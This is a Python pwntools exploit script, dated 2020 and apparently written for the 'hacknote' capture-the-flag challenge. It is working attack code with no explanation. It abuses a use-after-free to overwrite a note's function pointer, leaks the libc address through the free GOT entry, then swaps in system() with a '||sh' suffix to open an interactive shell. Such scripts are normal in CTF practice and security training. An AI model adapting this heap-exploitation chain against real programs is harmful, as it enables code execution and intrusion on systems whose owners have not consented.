#+++++++++++++++++++hacknote.py++++++++++++++++++++
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: Sun Oct 25 01:31:49 CST 2020
#+++++++++++++++++++hacknote.py++++++++++++++++++++
from pwn import*

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./hacknote')
libc = ELF('./libc-2.23_32.so')
# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_L = ELF('/lib/i386-linux-gnu/libc.so.6')

def add(size,cont):
	sh.sendlineafter('Your choice :','1')
	sh.sendlineafter('Note size :',str(size))
	sh.sendlineafter('Content :',str(cont))

def delete(index):	
	sh.sendlineafter('Your choice :','2')
	sh.sendlineafter('Index :',str(index))

def show(index):
	sh.sendlineafter('Your choice :','3')
	sh.sendlineafter('Index :',str(index))

def exit():
	sh.sendlineafter('Your choice :','4')

sh = process('./hacknote')
#sh = remote('node3.buuoj.cn',25253)

add(0x10,'AAAA') #0
add(0x10,'BBBB') #1
delete(0)  
delete(1)
payload = p32(0x0804862B) + p32(elf.got['free'])
add(8,payload)  #2

show(0)
libc_addr = u32(sh.recv(4)) - libc_L.symbols['free']
system_addr = libc_addr + libc_L.symbols['system']
log.success("libc_addr====>"+str(hex(libc_addr)))
log.success("system_addr=====>"+str(hex(system_addr)))
#gdb.attach(sh)

delete(2)
payload = p32(system_addr) + "||sh"
add(8,payload)
gdb.attach(sh,'b*0x0804893D')
show(0)

sh.interactive()
